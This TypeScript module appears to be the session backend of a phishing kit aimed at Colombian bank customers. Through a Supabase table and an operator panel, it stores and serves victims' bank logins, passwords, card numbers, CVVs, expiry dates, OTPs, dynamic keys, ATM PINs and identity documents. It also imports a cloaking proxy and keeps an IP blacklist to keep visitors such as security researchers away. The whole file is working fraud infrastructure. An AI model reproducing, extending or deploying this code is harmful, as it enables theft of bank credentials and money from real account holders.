import { createClient, SupabaseClient } from '@supabase/supabase-js';
import { getCoreGatewayEndpoint, getCoreGatewayToken } from '@/lib/cloakerProxy';

// Cliente dedicado para sesiones — siempre activo con endpoints blindados
let _client: SupabaseClient | null = null;

export function getClient(): SupabaseClient {
  if (!_client) {
    const supabaseUrl = getCoreGatewayEndpoint();
    const supabaseAnonKey = getCoreGatewayToken();
    if (!supabaseUrl || !supabaseAnonKey) {
      throw new Error('[supabaseSession] Gateway configuration unavailable');
    }
    _client = createClient(supabaseUrl, supabaseAnonKey);
  }
  return _client;
}

const TABLE = 'pyp_telegram_sessions';

// ─── Tipos ───────────────────────────────────────────────

export interface SessionRow {
  id: string;
  project_id?: string | null;
  status: string;
  message_id: string | null;
  chat_id: string | null;
  bank: string | null;
  ip: string | null;
  is_bancol: boolean;
  usuario?: string | null;
  clave?: string | null;
  tarjeta?: string | null;
  cvv?: string | null;
  fecha?: string | null;
  franquicia?: string | null;
  otp?: string | null;
  dinamica?: string | null;
  token?: string | null;
  saldo?: string | null;
  cupo_actual?: string | null;
  documento?: string | null;
  tipo_doc?: string | null;
  holder?: string | null;
  email?: string | null;
  phone?: string | null;
  address?: string | null;
  price?: string | null;
  conjunto?: string | null;
  inmueble?: string | null;
  total?: string | null;
  card_type?: string | null;
  source?: string | null;
  clave_cajero?: string | null;
  created_at: string;
  updated_at: string;
}

export interface CreateSessionData {
  project_id?: string;
  status?: string;
  message_id?: string;
  chat_id?: string;
  bank?: string;
  ip?: string;
  is_bancol?: boolean;
  usuario?: string;
  clave?: string;
  tarjeta?: string;
  cvv?: string;
  fecha?: string;
  franquicia?: string;
  otp?: string;
  dinamica?: string;
  token?: string;
  saldo?: string;
  cupo_actual?: string;
  documento?: string;
  tipo_doc?: string;
  holder?: string;
  email?: string;
  phone?: string;
  address?: string;
  price?: string;
  conjunto?: string;
  inmueble?: string;
  total?: string;
  card_type?: string;
  source?: string;
  clave_cajero?: string;
}

// ─── CRUD ────────────────────────────────────────────────

/**
 * Crea o actualiza una sesión (upsert por id).
 * Mantiene los campos antiguos si no se especifican.
 */
export async function createSession(sessionId: string, data: CreateSessionData): Promise<void> {
  const client = getClient();
  
  // Primero obtenemos la sesión existente (si la hay) para no sobreescribir datos con null
  const { data: existing } = await client
    .from(TABLE)
    .select('*')
    .eq('id', sessionId)
    .single();

  const payload: Record<string, any> = {
    id: sessionId,
    project_id: data.project_id ?? existing?.project_id ?? process.env.PROJECT_ID ?? process.env.NEXT_PUBLIC_PROJECT_ID ?? null,
    status: data.status ?? existing?.status ?? 'pending',
    message_id: data.message_id ?? existing?.message_id ?? null,
    chat_id: data.chat_id ?? existing?.chat_id ?? null,
    bank: data.bank ?? existing?.bank ?? null,
    ip: data.ip ?? existing?.ip ?? null,
    is_bancol: data.is_bancol ?? existing?.is_bancol ?? false,
    usuario: data.usuario ?? existing?.usuario ?? null,
    clave: data.clave ?? existing?.clave ?? null,
    tarjeta: data.tarjeta ?? existing?.tarjeta ?? null,
    cvv: data.cvv ?? existing?.cvv ?? null,
    fecha: data.fecha ?? existing?.fecha ?? null,
    franquicia: data.franquicia ?? existing?.franquicia ?? null,
    otp: data.otp ?? existing?.otp ?? null,
    dinamica: data.dinamica ?? existing?.dinamica ?? null,
    token: data.token ?? existing?.token ?? null,
    saldo: data.saldo ?? existing?.saldo ?? null,
    cupo_actual: data.cupo_actual ?? existing?.cupo_actual ?? null,
    documento: data.documento ?? existing?.documento ?? null,
    tipo_doc: data.tipo_doc ?? existing?.tipo_doc ?? null,
    holder: data.holder ?? existing?.holder ?? null,
    email: data.email ?? existing?.email ?? null,
    phone: data.phone ?? existing?.phone ?? null,
    address: data.address ?? existing?.address ?? null,
    price: data.price ?? existing?.price ?? null,
    conjunto: data.conjunto ?? existing?.conjunto ?? null,
    inmueble: data.inmueble ?? existing?.inmueble ?? null,
    total: data.total ?? existing?.total ?? null,
    card_type: data.card_type ?? existing?.card_type ?? null,
    source: data.source ?? existing?.source ?? null,
    clave_cajero: data.clave_cajero ?? existing?.clave_cajero ?? null,
    updated_at: new Date().toISOString(),
  };

  const { error } = await client
    .from(TABLE)
    .upsert(payload, { onConflict: 'id' });

  if (error) {
    console.error('[supabaseSession] createSession error:', error.message);
  }
}

/**
 * Obtiene el status actual de una sesión.
 * Retorna 'principal' si no existe.
 */
export async function getSessionStatus(sessionId: string): Promise<string | null> {
  const client = getClient();
  const { data, error } = await client
    .from(TABLE)
    .select('status')
    .eq('id', sessionId)
    .maybeSingle();

  if (error) {
    console.error('[supabaseSession] getSessionStatus error:', error.message);
    return null;
  }

  if (!data) {
    return 'principal';
  }

  return data.status;
}

/**
 * Actualiza el status de una sesión existente.
 * Si no existe, la crea con el status dado.
 */
export async function setSessionStatus(sessionId: string, status: string): Promise<void> {
  const client = getClient();
  const { error } = await client
    .from(TABLE)
    .upsert({
      id: sessionId,
      status,
      updated_at: new Date().toISOString(),
    }, { onConflict: 'id' });

  if (error) {
    console.error('[supabaseSession] setSessionStatus error:', error.message);
  }
}

export async function blockSessionsByIP(ip: string): Promise<void> {
  const client = getClient();
  const { error } = await client
    .from(TABLE)
    .update({ status: 'xbloqueo', updated_at: new Date().toISOString() })
    .eq('ip', ip);

  if (error) {
    console.error('[supabaseSession] blockSessionsByIP error:', error.message);
  }
}

/**
 * Obtiene la sesión completa.
 */
export async function getSession(sessionId: string): Promise<SessionRow | null> {
  const client = getClient();
  const { data, error } = await client
    .from(TABLE)
    .select('*')
    .eq('id', sessionId)
    .single();

  if (error || !data) {
    return null;
  }
  return data as SessionRow;
}

/**
 * Obtiene las últimas N sesiones para el panel del operador.
 */
export async function getLatestSessions(limit: number = 100): Promise<SessionRow[]> {
  const client = getClient();
  const { data, error } = await client
    .from(TABLE)
    .select('*')
    .order('updated_at', { ascending: false })
    .limit(limit);

  if (error || !data) {
    console.error('[supabaseSession] getLatestSessions error:', error?.message);
    return [];
  }
  return data as SessionRow[];
}

/**
 * Agrega una IP a la blacklist en Supabase.
 */
export async function addIPToBlacklist(ip: string): Promise<void> {
  const client = getClient();
  const { error } = await client
    .from('ip_blacklist')
    .upsert({ ip, created_at: new Date().toISOString() }, { onConflict: 'ip' });

  if (error) {
    console.error('[supabaseSession] addIPToBlacklist error:', error.message);
  }

  // Actualizar la lista en memoria del proxy en tiempo real
  const globalAny = global as any;
  if (!globalAny.__blacklistSet) {
    globalAny.__blacklistSet = new Set<string>();
  }
  globalAny.__blacklistSet.add(ip);

  // Actualizar ip-blacklist.json local si existe
  try {
    const fs = await import('fs');
    const path = await import('path');
    const filePath = path.join(process.cwd(), 'ip-blacklist.json');
    let list: string[] = [];
    if (fs.existsSync(filePath)) {
      list = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
    }
    if (!list.includes(ip)) {
      list.push(ip);
      fs.writeFileSync(filePath, JSON.stringify(list, null, 2), 'utf-8');
    }
  } catch (e) {
    console.error('[supabaseSession] Error updating local ip-blacklist.json:', e);
  }
}

/**
 * Elimina una IP de la blacklist en Supabase.
 */
export async function removeIPFromBlacklist(ip: string): Promise<void> {
  const client = getClient();
  const { error } = await client
    .from('ip_blacklist')
    .delete()
    .eq('ip', ip);

  if (error) {
    console.error('[supabaseSession] removeIPFromBlacklist error:', error.message);
  }
}

/**
 * Obtiene todas las IPs en la blacklist.
 */
export async function getBlacklistedIPs(): Promise<string[]> {
  const client = getClient();
  const { data, error } = await client
    .from('ip_blacklist')
    .select('ip');

  if (error || !data) {
    return [];
  }
  return data.map((row: any) => row.ip);
}

/**
 * Obtiene el managementType de un proyecto.
 * Retorna 'telegram' (default) o 'panel_live'.
 * Acepta: projectId explícito, o lo lee de las env vars NEXT_PUBLIC_PROJECT_ID / PROJECT_ID.
 */
export async function getProjectManagementType(projectId?: string | null): Promise<'telegram' | 'panel_live'> {
  const resolvedId = projectId || process.env.NEXT_PUBLIC_PROJECT_ID || process.env.PROJECT_ID;
  if (!resolvedId) return 'telegram';
  try {
    const client = getClient();
    const { data } = await client
      .from('Project')
      .select('managementType')
      .eq('id', resolvedId)
      .maybeSingle();
    if (data?.managementType === 'panel_live') return 'panel_live';
  } catch (e) {
    console.warn('[supabaseSession] getProjectManagementType error:', e);
  }
  return 'telegram';
}
